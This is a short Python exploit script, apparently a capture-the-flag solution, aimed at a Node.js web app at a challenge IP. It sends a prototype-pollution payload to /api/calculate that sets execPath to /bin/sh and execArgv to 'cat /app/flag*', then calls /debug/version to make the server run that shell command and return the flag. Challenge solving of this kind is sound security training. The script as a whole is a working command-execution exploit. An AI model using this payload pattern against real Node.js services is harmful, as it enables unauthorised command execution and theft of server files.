import requests

# host = 'http://localhost:1337'
host = 'http://167.99.195.247:31348'

requests.post(f'{host}/api/calculate', json={
    'constructor': {
        'prototype': {
            'execPath': '/bin/sh',
            'execArgv': ['-c', 'cat /app/flag*']
        }
    }
})

res = requests.get(f'{host}/debug/version')
print(res.text)
